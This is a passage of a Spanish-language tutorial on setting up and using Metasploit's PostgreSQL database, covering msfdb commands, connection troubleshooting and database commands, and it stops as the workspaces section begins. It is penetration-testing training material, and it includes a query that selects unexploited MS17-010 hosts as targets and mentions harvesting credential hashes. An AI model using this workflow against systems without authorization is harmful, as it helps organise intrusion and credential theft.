# Sección 7: Databases en Metasploit

## 📋 Tabla de Contenidos

1. [¿Por Qué Necesitamos Databases?](#por-qué-necesitamos-databases)
2. [PostgreSQL en Metasploit](#postgresql-en-metasploit)
3. [Configurar la Database](#configurar-la-database)
4. [Comandos de Database](#comandos-de-database)
5. [Workspaces](#workspaces)
6. [Importar Resultados de Scans](#importar-resultados-de-scans)
7. [Usar Nmap Dentro de MSFconsole](#usar-nmap-dentro-de-msfconsole)
8. [Backup de Datos](#backup-de-datos)
9. [Comando: hosts](#comando-hosts)
10. [Comando: services](#comando-services)
11. [Comando: creds](#comando-creds)
12. [Comando: loot](#comando-loot)

---

## 🎯 ¿Por Qué Necesitamos Databases?

### El Problema de la Sobrecarga de Información

> "Databases in msfconsole are used to keep track of your results. It is no mystery that during even more complex machine assessments, much less entire networks, things can get a little fuzzy and complicated due to the sheer amount of search results, entry points, detected issues, discovered credentials, etc."

Vamos a entender este problema con un **ejemplo real** paso a paso.

### Escenario Real: Pentest de Red Corporativa

```
CLIENTE: Acme Corporation
ALCANCE: Red corporativa completa
RED PRINCIPAL: 192.168.1.0/24 (256 IPs potenciales)
DURACIÓN DEL ENGAGEMENT: 2 semanas (10 días hábiles)
EQUIPO: Tú solo
```

**DÍA 1 - Descubrimiento Inicial**:
```
Ejecutas: nmap -sV -sC 192.168.1.0/24

RESULTADOS:
  ✅ 87 hosts activos encontrados
  ✅ 342 puertos abiertos en total
  ✅ 156 servicios identificados
  ✅ 23 sistemas operativos diferentes
```

**Ya tienes un problema**: ¿Dónde guardas esta información?

**DÍA 3 - Vulnerability Scanning**:
```
Ejecutas: Nessus scan completo

RESULTADOS:
  ⚠️  243 vulnerabilidades totales
  🔴 12 vulnerabilidades CRÍTICAS
  🟠 45 vulnerabilidades ALTAS  
  🟡 186 vulnerabilidades medias/bajas
```

**DÍA 5 - Primeros Compromisos**:
```
Has logrado acceso inicial a:
  ✅ 5 máquinas Windows
  ✅ 3 servidores Linux
  ✅ 2 switches de red

CREDENCIALES EXTRAÍDAS:
  🔑 47 hashes NTLM de Windows
  🔑 23 contraseñas en texto plano
  🔑 8 llaves SSH privadas
  🔑 156 entradas de /etc/shadow
```

**DÍA 7 - Pivoting a Redes Internas**:
```
Descubres 3 redes adicionales desde hosts comprometidos:
  
  📡 Red DMZ: 10.10.10.0/24
     └─ 34 hosts adicionales
  
  📡 Red Interna Corporativa: 172.16.0.0/16
     └─ 189 hosts adicionales
  
  📡 Red Administrativa: 192.168.200.0/24
     └─ 11 hosts adicionales

TOTAL ACUMULADO: 321 hosts únicos
```

**DÍA 10 - Post-Explotación Intensiva**:
```
Datos recopilados hasta ahora:
  
  🖥️  Hosts: 321
  🔌 Servicios detectados: 1,247
  🐛 Vulnerabilidades identificadas: 543
  🔑 Credenciales únicas: 203
  🎯 Sesiones Meterpreter activas: 15
  💾 Archivos descargados (loot): 89
  📝 Notas y observaciones: 167
```

**PREGUNTA CRÍTICA**: ¿Cómo organizas TODO esto?

---

### El Caos Absoluto SIN Database

Veamos **tres intentos fallidos** de organizar esta información:

#### ❌ Intento 1: Archivos de Texto Plano

```bash
$ ls ~/pentest_acme_corp/

# DÍA 1
hosts_encontrados_dia1.txt
servicios_dia1.txt
nmap_scan_completo.txt

# DÍA 2  
hosts_encontrados_dia2_ACTUALIZADO.txt
hosts_encontrados_dia2_v2.txt
servicios_nuevos.txt

# DÍA 3
vulnerabilidades_nessus_criticas.txt
vulnerabilidades_nessus_todas.txt
hosts_dia3_FINAL.txt
hosts_dia3_FINAL_v2.txt
hosts_dia3_REAL_FINAL.txt

# DÍA 5
credenciales_windows_DC.txt
credenciales_windows_workstations.txt
credenciales_linux.txt
credenciales_switches.txt
hashes_ntlm_DIA5.txt
TODAS_LAS_CREDENCIALES_JUNTAS.txt
TODAS_LAS_CREDENCIALES_JUNTAS_v2_corregido.txt

# DÍA 7
red_dmz_hosts.txt
red_interna_hosts.txt
red_admin_hosts.txt
TODOS_LOS_HOSTS_CONSOLIDADO.txt
TODOS_LOS_HOSTS_CONSOLIDADO_FINAL.txt

# DÍA 10
sesiones_activas_lunes.txt
sesiones_activas_martes.txt
sesiones_activas_miercoles.txt
archivos_descargados_log.txt
notas_importantes.txt
notas_MUY_importantes.txt
TODO_JUNTO_MASTER_FILE.txt

... (y continúa creciendo) 
```

**PROBLEMAS REALES**:

1. **Duplicación y Desactualización**:
   ```
   ¿hosts_dia3_FINAL.txt es más actual que 
   TODOS_LOS_HOSTS_CONSOLIDADO.txt?
   
   ¿O viceversa?
   
   ¿Qué archivo tiene la información correcta?
   
   ❌ NO TIENES IDEA
   ```

2. **Búsqueda Manual Horrible**:
   ```bash
   Cliente: "¿Cuántos servidores Windows Server 2019 
            tienen el puerto 445 abierto con MS17-010?"
   
   Tú: *suspiro profundo*
        $ grep "Windows Server 2019" *.txt
        $ grep "445" *.txt  
        $ grep "MS17-010" *.txt
        *comparas manualmente 3 resultados*
        *30 minutos después*
        "Ehhh... creo que son 7... o 8..."
   ```

3. **Pérdida de Relaciones**:
   ```
   Archivo: credenciales_windows_DC.txt
   admin:P@ssw0rd123
   
   PERO... ¿En qué host funciona esta credencial?
   ¿En el 192.168.1.50? ¿O era el .60?
   ¿Qué servicio? ¿SMB? ¿RDP? ¿WinRM?
   
   ❌ Tienes que revisar 10 archivos para encontrarlo
   ```

#### ❌ Intento 2: Hoja de Cálculo Excel Gigante

```
Archivo: Pentest_Acme_Corp_Master.xlsx (47 MB)

HOJAS:
  📊 Hosts (321 filas × 25 columnas)
  📊 Services (1,247 filas × 15 columnas)
  📊 Vulnerabilities (543 filas × 30 columnas)
  📊 Credentials (203 filas × 12 columnas)
  📊 Sessions (15 filas × 20 columnas)
  📊 Loot (89 filas × 10 columnas)
  📊 Notes (167 filas × 5 columnas)
  📊 Timeline (10 filas × 8 columnas)
```

**PROBLEMAS REALES**:

1. **Performance Horrible**:
   ```
   Excel con 47 MB:
     - Tarda 15 segundos en abrir
     - Se congela al filtrar
     - Fórmulas se rompen constantemente
     - Copiar/pegar = 5 segundos de lag
     - Guardar = 30 segundos
   ```

2. **No se Integra con Metasploit**:
   ```
   msf6 > use exploit/windows/smb/ms17_010_eternalblue
   msf6 exploit(...) > set RHOSTS ???
   
   *Alt+Tab a Excel*
   *Busca hosts vulnerables*
   *Copia IP manualmente*
   *Alt+Tab de vuelta*
   *Pega en Metasploit*
   *Repite para cada host*
   
   ❌ 50 hosts = 50 veces copiar/pegar manual
   ```

3. **Actualizaciones Manuales**:
   ```
   Comprometes nuevo host:
     1. Alt+Tab a Excel
     2. Busca la fila del host
     3. Actualiza columna "Comprometido"
     4. Actualiza columna "Fecha Compromiso"
     5. Actualiza columna "Método"
     6. Actualiza columna "Sesión ID"
     7. Guarda (30 segundos)
     8. Alt+Tab de vuelta a Metasploit
   
   ❌ Pierdes el contexto, pierdes tiempo
   ```

#### ❌ Intento 3: Confiar en Tu Memoria

```
LUNES 9:00 AM:
  Tú: "Ok, 192.168.1.50 tiene MS17-010"
      *lo recuerdas perfectamente*

LUNES 11:30 AM:
  Tú: "Uhh... ¿cuál IP tenía MS17-010?"
      "¿Era .50 o .60?"

MARTES 2:00 PM:
  Tú: "¿En qué sesión estaba conectado a la red DMZ?"
      "¿Era session 3? ¿O session 7?"
      *sessions -l*
      *15 sesiones activas*
      "... no me acuerdo"

MIÉRCOLES 4:00 PM:
  Cliente: "¿Qué credenciales funcionaron en el DC?"
  Tú: *pánico*
       "Ehhh déjame buscarlo..."
       *revisa 10 archivos*
       *15 minutos después*
       "Ah sí, aquí está... admin:P@ssword123"

VIERNES 6:00 PM - ENTREGA DE REPORTE:
  Cliente: "El reporte dice que comprometiste 87 hosts,
           pero en la tabla solo hay 73. ¿Cuál es correcto?"
  
  Tú: *sudor frío*
       "Ehhh... déjame verificar..."
       *NO TIENES FORMA DE SABER CON CERTEZA*
```

---

### ✅ La Solución: Database de Metasploit (PostgreSQL)

**TODO en UN SOLO LUGAR, AUTOMÁTICAMENTE ORGANIZADO**:

```
┌─────────────────────────────────────────────────────────┐
│         POSTGRESQL DATABASE: "msf"                      │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  📊 TABLA: hosts                                        │
│     ├─ 321 entradas                                     │
│     ├─ Auto-actualizada en cada scan                    │
│     ├─ Búsqueda instantánea (SQL queries)              │
│     └─ Relaciones con: services, vulns, creds          │
│                                                         │
│  📊 TABLA: services                                     │
│     ├─ 1,247 entradas                                   │
│     ├─ Cada servicio vinculado a su host               │
│     └─ Relaciones con: vulns, exploits                 │
│                                                         │
│  📊 TABLA: vulns                                        │
│     ├─ 543 entradas                                     │
│     ├─ Cada vuln vinculada a host + service            │
│     └─ CVEs, referencias, severity                     │
│                                                         │
│  📊 TABLA: creds                                        │
│     ├─ 203 entradas                                     │
│     ├─ Tipos: password, ntlm, ssh-key                  │
│     ├─ Vinculadas a host + servicio                    │
│     └─ realm, username, hash                           │
│                                                         │
│  📊 TABLA: sessions                                     │
│     ├─ 15 sesiones activas                             │
│     ├─ Estado en tiempo real                           │
│     └─ Host, tipo, routes, permisos                    │
│                                                         │
│  📊 TABLA: loot                                         │
│     ├─ 89 archivos                                      │
│     ├─ Organizados por tipo                            │
│     └─ Ruta, contenido, host origen                    │
│                                                         │
│  📊 TABLA: notes                                        │
│     ├─ 167 notas                                        │
│     └─ Searchable, vinculadas a hosts                  │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

**CONSULTAS INSTANTÁNEAS**:

```bash
# Pregunta del cliente:
# "¿Cuántos servidores Windows Server 2019 tienen 
#  puerto 445 abierto con MS17-010?"

msf6 > services -S "microsoft-ds" -p 445 | \
       grep "Windows.*2019" | wc -l

# Respuesta: Instantánea
# Output: 8 hosts

# ¿Cuáles son?
msf6 > services -S "microsoft-ds" -p 445 | grep "2019"

# Lista completa de IPs en 0.5 segundos
```

**ACTUALIZACIÓN AUTOMÁTICA**:

```bash
# Comprometes nuevo host
msf6 > exploit
[*] Meterpreter session 16 opened

# Database se actualiza AUTOMÁTICAMENTE:
#   - hosts table: marca como "comprometido"
#   - sessions table: agrega session 16
#   - Timestamp automático
#   - Relaciones actualizadas

# NO necesitas hacer NADA manual
```

**EXPORTAR TODO**:

```bash
# Final del pentest
msf6 > db_export -f xml acme_corp_final_report.xml

[*] Exported: 
    - 321 hosts
    - 1,247 services  
    - 543 vulnerabilities
    - 203 credentials
    - 89 loot files
    - 167 notes

# UN SOLO ARCHIVO con TODO
# Importable a otras herramientas
# Backup completo
```

---

### Beneficios Comparativos

| Aspecto | 📝 Archivos .txt | 📊 Excel | 🧠 Memoria | 🐘 PostgreSQL DB |
|---------|------------------|----------|------------|------------------|
| **Búsqueda** | `grep` manual en 50+ archivos | Filtros lentos, Excel se congela | Imposible después de día 3 | SQL instantáneo |
| **Actualización** | Editar 10 archivos manualmente | Abrir → Editar → Guardar (lento) | "Lo recordaré" (no lo harás) | Automática |
| **Relaciones** | Ninguna, todo suelto | Fórmulas que se rompen | No existen | Foreign keys, relaciones 1-a-muchos |
| **Performance** | Lento con archivos grandes | Horrible con 1000+ filas | N/A | Rápido con millones de filas |
| **Integridad** | Fácil corromper/perder | Una celda mal = todo mal | 100% no confiable | ACID transactions |
| **Integración MSF** | Cero | Cero | Cero | ✅ Nativa y completa |
| **Backup** | Copiar 50+ archivos | Un archivo enorme | ¿Backup de memoria? | `db_export` un comando |
| **Colaboración** | Email con adjuntos | Compartir archivo | No es posible | Exportar/importar DB |

---

### Analogía Perfecta: Biblioteca Sin vs Con Catálogo

**SIN DATABASE = BIBLIOTECA ANTIGUA SIN CATÁLOGO**:

```
Año 1850 - Biblioteca del Monasterio:

📚 10,000 libros apilados en el piso
📚 Sin orden alfabético
📚 Sin categorías
📚 Sin índice

Monje 1: "¿Dónde está el libro sobre astronomía?"
Monje 2: "Uhh... en alguno de esos 50 montones..."
         *3 horas buscando*
         *encuentra 5 libros de astronomía*
         *se perdió 1 libro que estaba en otro montón*

Visitante: "¿Tienen libros del autor Galileo?"
Monje: "Probablemente... déjame buscar..."
       *busca en 10 montones*
       *se rinde después de 2 horas*
       "No estoy seguro..."

RESULTADO: 
  ❌ Pérdida de tiempo
  ❌ Libros perdidos/olvidados
  ❌ No se puede saber qué hay exactamente
  ❌ Imposible responder consultas complejas
```

**CON DATABASE = BIBLIOTECA MODERNA CON SISTEMA DEWEY**:

```
Año 2025 - Biblioteca Digital:

📚 10,000 libros catalogados
📚 Base de datos computarizada
📚 Cada libro tiene metadata:
    - Título
    - Autor
    - Categoría
    - Ubicación física
    - Estado (prestado/disponible)
    - ISBN
    - Relaciones (serie, autor, tema)

Visitante: "¿Tienen libros sobre astronomía de Galileo?"
Bibliotecario: *escribe en computadora*
                *0.5 segundos*
                "Sí, tenemos 3:"
                - Sidereus Nuncius (Estante A5, disponible)
                - Dialogo (Estante A7, prestado hasta 25/01)
                - Il Saggiatore (Estante A6, disponible)

Visitante: "¿Qué otros autores escribieron sobre
            astronomía en el mismo período?"
Bibliotecario: *query SQL*
                *2 segundos*
                "Aquí hay 15 autores relacionados..."

RESULTADO:
  ✅ Respuestas instantáneas
  ✅ Todo catalogado y ubicable
  ✅ Consultas complejas posibles
  ✅ Relaciones entre datos visibles
```

**Eso es exactamente la diferencia entre pentest SIN database vs CON database.**

---

## 🐘 PostgreSQL en Metasploit

### ¿Qué es PostgreSQL?

**PostgreSQL** = Sistema de gestión de bases de datos relacionales (RDBMS) de código abierto, considerado uno de los más avanzados y robustos del mundo.

**Características que lo hacen ideal**:

```
✅ Open Source          (100% gratuito)
✅ ACID Compliant       (transacciones confiables)
✅ SQL Completo         (consultas complejas)
✅ Escalabilidad        (desde KB hasta TB)
✅ Relaciones Complejas (foreign keys, joins)
✅ Performance          (optimizado para lecturas/escrituras)
✅ Extensible           (plugins, tipos custom)
✅ Maduro               (30+ años de desarrollo)
```

**Usado por empresas gigantes**:
- 🍎 Apple
- 🎵 Spotify  
- 📸 Instagram
- 💬 Reddit
- 🎬 Netflix
- 🚗 Uber

Si es **suficientemente bueno para Instagram** (millones de usuarios), es suficientemente bueno para tu pentest.

---

### ¿Por Qué Metasploit Usa PostgreSQL Específicamente?

Metasploit podría haber usado otras databases (MySQL, SQLite, MongoDB). ¿Por qué PostgreSQL?

#### Razón 1: Relaciones Complejas (Foreign Keys)

**El Problema**:

Un solo host puede tener:
- 10 servicios diferentes
- Cada servicio puede tener 5 vulnerabilidades
- Cada vulnerabilidad puede tener múltiples referencias (CVEs)
- Cada host puede tener 20 credenciales
- Cada credencial puede funcionar en múltiples servicios

Esto es una **red compleja de relaciones**.

**PostgreSQL maneja esto perfectamente**:

```sql
-- Tabla: hosts
CREATE TABLE hosts (
  id SERIAL PRIMARY KEY,
  address VARCHAR(255),
  os_name VARCHAR(255),
  ...
);

-- Tabla: services (relacionada con hosts)
CREATE TABLE services (
  id SERIAL PRIMARY KEY,
  host_id INTEGER REFERENCES hosts(id),  -- ← Foreign key
  port INTEGER,
  name VARCHAR(255),
  ...
);

-- Tabla: vulns (relacionada con services)
CREATE TABLE vulns (
  id SERIAL PRIMARY KEY,
  service_id INTEGER REFERENCES services(id),  -- ← Foreign key
  name VARCHAR(255),
  ...
);
```

**Visualización**:

```
HOST: 192.168.1.10
  ├── SERVICE: 445/tcp (SMB)
  │   ├── VULN: MS17-010
  │   ├── VULN: SMB Signing Disabled
  │   └── CRED: admin:P@ssw0rd123
  │
  ├── SERVICE: 3389/tcp (RDP)
  │   ├── VULN: BlueKeep (CVE-2019-0708)
  │   └── CRED: admin:P@ssw0rd123 (misma!)
  │
  └── SERVICE: 135/tcp (MSRPC)
      └── No vulns conocidas
```

PostgreSQL mantiene todas estas relaciones **consistentes y rápidas**.

#### Razón 2: Consultas SQL Complejas

**Consulta compleja real**:

```sql
-- "Dame todos los hosts Windows que tengan puerto 445 abierto
--  Y que tengan MS17-010
--  Y que NO hayan sido comprometidos aún"

SELECT h.address 
FROM hosts h
  INNER JOIN services s ON h.id = s.host_id
  INNER JOIN vulns v ON s.id = v.service_id
  LEFT JOIN sessions sess ON h.id = sess.host_id
WHERE h.os_name LIKE '%Windows%'
  AND s.port = 445
  AND v.name = 'MS17-010'
  AND sess.id IS NULL;
```

**Output**: Lista de targets perfectos para explotar.

**Tiempo de ejecución**: 0.05 segundos (en database con 10,000 hosts).

**Con SQLite** (database más simple): Esto sería MUCHO más lento o directamente imposible.

#### Razón 3: Performance con Grandes Volúmenes

```
COMPARACIÓN DE PERFORMANCE:

SQLite (archivo local):
  - 1,000 hosts:    ✅ OK
  - 10,000 hosts:   ⚠️  LENTO (5-10 segundos por query)
  - 100,000 hosts:  ❌ MUERE (queries de minutos)

PostgreSQL (servidor dedicado):
  - 1,000 hosts:    ✅ RÁPIDO (0.01 segundos)
  - 10,000 hosts:   ✅ RÁPIDO (0.05 segundos)
  - 100,000 hosts:  ✅ TODAVÍA RÁPIDO (0.5 segundos)
  - 1,000,000 hosts: ✅ Aceptable (2-5 segundos)
```

**Pentests empresariales** pueden tener **decenas de miles de hosts**. PostgreSQL escala perfectamente.

#### Razón 4: ACID Compliance (Integridad de Datos)

**ACID** = Atomicity, Consistency, Isolation, Durability

**¿Qué significa en la práctica?**

**ESCENARIO SIN ACID** (archivo de texto):

```
1. Metasploit escribe: "Host 192.168.1.50 comprometido"
2. A mitad de escritura, Metasploit crashea
3. Archivo queda corrupto:
   "Host 192.168.1.50 compr"  ← Incompleto
4. Pierdes datos, archivo ilegible
```

**ESCENARIO CON ACID** (PostgreSQL):

```
1. Metasploit inicia transacción: BEGIN
2. Escribe: "Host 192.168.1.50 comprometido"
3. A mitad de escritura, Metasploit crashea
4. PostgreSQL hace ROLLBACK automático
5. Database vuelve al estado anterior (consistente)
6. NO hay corrupción de datos
```

**Garantía**: Tus datos están **siempre en un estado válido**.

---

### Arquitectura de Database en Metasploit

```
┌──────────────────────────────────────────────────────────┐
│                  SISTEMA OPERATIVO                       │
│                    (Linux / Kali)                        │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  ┌────────────────────────────────────────────────────┐ │
│  │         POSTGRESQL SERVER (Proceso)                │ │
│  │  ─────────────────────────────────────────────────│ │
│  │  Puerto: 5432 (localhost solamente)               │ │
│  │  Database: "msf"                                  │ │
│  │  Usuario: "msf"                                   │ │
│  │  Password: [auto-generado al instalar]           │ │
│  │  ───────────────────────────────────────────────  │ │
│  │                                                   │ │
│  │  Tablas principales:                              │ │
│  │    - hosts                                        │ │
│  │    - services                                     │ │
│  │    - vulns                                        │ │
│  │    - creds                                        │ │
│  │    - sessions                                     │ │
│  │    - loot                                         │ │
│  │    - notes                                        │ │
│  │    - ... (20+ tablas en total)                    │ │
│  └────────────────────────────────────────────────────┘ │
│                          ↑                               │
│                          │                               │
│              Conexión TCP (localhost:5432)               │
│                          │                               │
│                          ↓                               │
│  ┌────────────────────────────────────────────────────┐ │
│  │          MSFCONSOLE (Cliente)                      │ │
│  │  ───────────────────────────────────────────────── │ │
│  │  - Lee config de database.yml                     │ │
│  │  - Se conecta a PostgreSQL                        │ │
│  │  - Ejecuta queries SQL automáticamente            │ │
│  │  - Comandos: hosts, services, vulns, etc.         │ │
│  └────────────────────────────────────────────────────┘ │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

**Archivo de Configuración**: `/usr/share/metasploit-framework/config/database.yml`

```yaml
# Contenido del archivo database.yml

production:
  adapter: postgresql        # ← Tipo de database
  database: msf              # ← Nombre de la database
  username: msf              # ← Usuario
  password: [random_pass]    # ← Password (generado automáticamente)
  host: localhost            # ← Solo accesible localmente (seguridad)
  port: 5432                 # ← Puerto estándar de PostgreSQL
  pool: 5                    # ← Conexiones simultáneas permitidas
  timeout: 5000              # ← Timeout en milisegundos
```

**Seguridad por Defecto**:
- ✅ PostgreSQL escucha **SOLO en localhost** (no accesible desde red)
- ✅ Password aleatorio fuerte
- ✅ Solo el usuario `msf` puede acceder
- ✅ No hay acceso remoto (evita ataques externos)

---

## ⚙️ Configurar la Database

Ahora vamos a configurar paso a paso la database de Metasploit.

### Paso 1: Verificar Estado de PostgreSQL

Primero necesitamos asegurarnos que PostgreSQL esté instalado y corriendo.

```bash
$ sudo service postgresql status

● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
     Active: active (exited) since Fri 2022-05-06 14:51:30 BST; 3min 51s ago
    Process: 2147 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
   Main PID: 2147 (code=exited, status=0/SUCCESS)
        CPU: 1ms

May 06 14:51:30 pwnbox-base systemd[1]: Starting PostgreSQL RDBMS...
May 06 14:51:30 pwnbox-base systemd[1]: Finished PostgreSQL RDBMS.
```

**Desglose de la Salida**:

| Campo | Valor Esperado | Significado |
|-------|----------------|-------------|
| `Loaded:` | `loaded` | ✅ El servicio existe y está configurado |
| `Active:` | `active (exited)` o `active (running)` | ✅ PostgreSQL está corriendo |
| `Main PID:` | Un número (ej: 2147) | ✅ ID del proceso principal |

**Si dice `Active: inactive (dead)`**: PostgreSQL NO está corriendo → Necesitas iniciarlo.

### Paso 2: Iniciar PostgreSQL (si está apagado)

```bash
$ sudo systemctl start postgresql
```

**¿Qué hace este comando?**

```
systemctl = System Control (gestor de servicios en Linux)
start = Iniciar el servicio
postgresql = El servicio PostgreSQL
```

**Analogía**: Es como presionar el botón de encendido de PostgreSQL.

**Output**: Normalmente NO hay output (Linux filosofía: "sin noticias = buenas noticias").

**Verificar que inició**:

```bash
$ sudo service postgresql status

● postgresql.service - PostgreSQL RDBMS
     Active: active (exited)  ← ✅ Ahora está activo
```

### Paso 3: Inicializar Database de Metasploit

Ahora que PostgreSQL está corriendo, necesitamos crear la database específica para Metasploit.

```bash
$ sudo msfdb init
```

**¿Qué hace `msfdb init`?**

```
PROCESO INTERNO (8 pasos):

PASO 1: Verificar que PostgreSQL esté corriendo
  └─> Si no está: ERROR y sale
  └─> Si está: Continúa

PASO 2: Crear usuario "msf" en PostgreSQL
  └─> Usuario: msf
  └─> Password: [random alphanumeric]
  └─> Permisos: CREATEDB

PASO 3: Crear database "msf" (producción)
  └─> Owner: msf
  └─> Encoding: UTF8

PASO 4: Crear database "msf_test" (testing)
  └─> Para developers de Metasploit
  └─> No la usarás en pentests

PASO 5: Generar archivo de configuración
  └─> Ubicación: /usr/share/metasploit-framework/config/database.yml
  └─> Contenido: credenciales de conexión

PASO 6: Crear schema inicial (estructura de tablas)
  └─> Ejecuta migrations (scripts SQL)
  └─> Crea tablas: hosts, services, vulns, creds, etc.
  └─> Crea índices (para performance)
  └─> Crea foreign keys (relaciones)

PASO 7: Insertar datos iniciales (seeds)
  └─> Datos base necesarios para MSF

PASO 8: ✅ COMPLETADO
```

### Salida Exitosa de `msfdb init`

**Instalación LIMPIA** (primera vez):

```bash
$ sudo msfdb init

[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
```

**Cada `[+]` es un paso exitoso** ✅

**Instalación donde database YA EXISTE**:

```bash
$ sudo msfdb init

[i] Database already started
[i] The database appears to be already configured, skipping initialization
```

Esto es **normal y OK** - significa que ya configuraste la database antes.

---

### Posibles Errores y Soluciones

#### Error 1: NoMethodError (Metasploit Desactualizado)

```bash
$ sudo msfdb init

[i] Database already started
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file
[+] Creating initial database schema
rake aborted!
NoMethodError: undefined method `without' for #<Bundler::Settings:0x000055dddcf8cba8>
Did you mean? with_options

<SNIP de error largo>
```

**Causa**: Versión de Metasploit desactualizada o incompatibilidad con gemas de Ruby.

**Solución**:

```bash
# 1. Actualizar sistema completo
$ sudo apt update && sudo apt upgrade -y

# 2. Actualizar Metasploit específicamente
$ sudo apt install metasploit-framework

# 3. Reintentar
$ sudo msfdb init

[i] The database appears to be already configured, skipping initialization
```

**Si el problema persiste**:

```bash
# Opción nuclear: Borrar y recrear database
$ sudo msfdb delete    # ⚠️ BORRA toda la data
$ sudo msfdb init      # Crea database nueva
```

#### Error 2: PostgreSQL No Está Corriendo

```bash
$ sudo msfdb init

[-] ERROR: PostgreSQL is not running
```

**Solución**:

```bash
$ sudo systemctl start postgresql
$ sudo msfdb init
```

#### Error 3: Permisos Insuficientes

```bash
$ msfdb init  # ← Sin sudo

permission denied for database msf
```

**Solución**: Usar `sudo`

```bash
$ sudo msfdb init
```

---

### Paso 4: Verificar Estado de la Database

Después de inicializar, verifica que todo esté OK:

```bash
$ sudo msfdb status

● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; disabled)
     Active: active (exited) since Mon 2022-05-09 15:19:57 BST; 35min ago
    Process: 2476 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
   Main PID: 2476 (code=exited, status=0/SUCCESS)
        CPU: 1ms

May 09 15:19:57 pwnbox-base systemd[1]: Starting PostgreSQL RDBMS...
May 09 15:19:57 pwnbox-base systemd[1]: Finished PostgreSQL RDBMS.

COMMAND   PID     USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
postgres 2458 postgres    5u  IPv6  34336      0t0  TCP localhost:5432 (LISTEN)
postgres 2458 postgres    6u  IPv4  34337      0t0  TCP localhost:5432 (LISTEN)

UID          PID    PPID  C STIME TTY      STAT   TIME CMD
postgres    2458       1  0 15:19 ?        Ss     0:00 /usr/lib/postgresql/13/bin/postgres -D /var/lib/postgresql/13/main -c con

[+] Detected configuration file (/usr/share/metasploit-framework/config/database.yml)
```

**Puntos Clave**:

1. **`Active: active`** ✅ - PostgreSQL corriendo
2. **`TCP localhost:5432 (LISTEN)`** ✅ - PostgreSQL escuchando en puerto 5432
3. **`Detected configuration file`** ✅ - database.yml existe

**TODO OK** - Database lista para usar.

---

### Paso 5: Conectar msfconsole a la Database

**Opción A: Inicio Automático con Database**

```bash
$ sudo msfdb run

[i] Database already started
                                                  
<SNIP - ASCII Art Banner de Metasploit>

       =[ metasploit v6.1.39-dev                          ]
+ -- --=[ 2214 exploits - 1171 auxiliary - 396 post       ]
+ -- --=[ 616 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

msf6 >
```

**`msfdb run` hace DOS cosas**:
1. Verifica que PostgreSQL esté corriendo
2. Inicia msfconsole con conexión a database automática

**Opción B: Conectar Manualmente**

```bash
$ msfconsole -q

msf6 > db_connect msf@localhost:5432/msf
[*] Connected to PostgreSQL database
```

**Desglose del comando**:
- `db_connect` = Comando para conectar
- `msf` = Usuario (antes de @)
- `localhost` = Host (database local)
- `5432` = Puerto de PostgreSQL
- `/msf` = Nombre de la database

### Paso 6: Verificar Conexión

```bash
msf6 > db_status

[*] Connected to msf. Connection type: PostgreSQL.
```

**Estados Posibles**:

| Output | Significado | Acción |
|--------|-------------|--------|
| `Connected to msf. Connection type: PostgreSQL.` | ✅ TODO OK | Puedes trabajar |
| `postgresql selected, no connection` | ❌ Config existe pero NO conectado | Reiniciar msfconsole con `msfdb run` |
| `No database support` | ❌ NO configurado | Ejecutar `msfdb init` |

---

### Reinicializar Database (Troubleshooting Avanzado)

Si tienes problemas persistentes (contraseña perdida, database corrupta):

```bash
# Paso 1: Reinicializar database
$ msfdb reinit
[*] Deleting old database
[*] Creating new database
[+] Database reinitialized

# Paso 2: Copiar config a directorio personal
$ cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/

# Paso 3: Reiniciar PostgreSQL
$ sudo service postgresql restart

# Paso 4: Iniciar msfconsole
$ msfconsole -q

# Paso 5: Verificar
msf6 > db_status
[*] Connected to msf. Connection type: PostgreSQL.
```

**¿Por qué copiar a `~/.msf4/`?**

```
Metasploit busca configuración en este orden:
  1. ~/.msf4/database.yml       ← Config personal (prioridad)
  2. /usr/share/metasploit-framework/config/database.yml  ← Config global

Al copiar a ~/.msf4/, aseguras que TU usuario tenga acceso.
```

---

## 📚 Comandos de Database

Una vez conectados, tenemos comandos especiales para interactuar con la database.

### Ver Ayuda Completa

```bash
msf6 > help database

Database Backend Commands
=========================

    Command           Description
    -------           -----------
    db_connect        Connect to an existing database
    db_disconnect     Disconnect from the current database instance
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache
    db_status         Show the current database status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces
```

### Tabla de Comandos Esenciales

| Comando | Función | Cuándo Usar |
|---------|---------|-------------|
| `db_status` | Ver estado de conexión | Verificar que estás conectado |
| `workspace` | Gestionar proyectos | Separar clientes/pentests |
| `db_import` | Importar scan XML | Importar Nmap/Nessus |
| `db_nmap` | Ejecutar Nmap | Scan directo desde MSF |
| `db_export` | Exportar database | Backup de toda la data |
| `hosts` | Listar hosts | Ver hosts descubiertos |
| `services` | Listar servicios | Ver servicios por puerto |
| `vulns` | Listar vulnerabilidades | Ver vulns encontradas |
| `creds` | Listar credenciales | Ver user/pass/hashes |
| `loot` | Listar archivos descargados | Ver loot extraído |
| `notes` | Listar notas | Ver anotaciones |

---

## 🗂️ Workspaces

### ¿Qué son los Workspaces?

> "We can think of Workspaces the same way we would think of folders in a project."

**Workspaces** = Carpetas virtuales que **separan completamente** la información de diferentes pentests/clientes/redes.

### Analogía: Sistema de Archivos

```
TU COMPUTADORA NORMAL:
/home/juan/Proyectos/
├── Cliente_Acme_Corp/
│   ├── hosts_discovered.txt
│   ├── vulnerabilities.txt
│   ├── credentials.txt
│   └── report_final.pdf
│
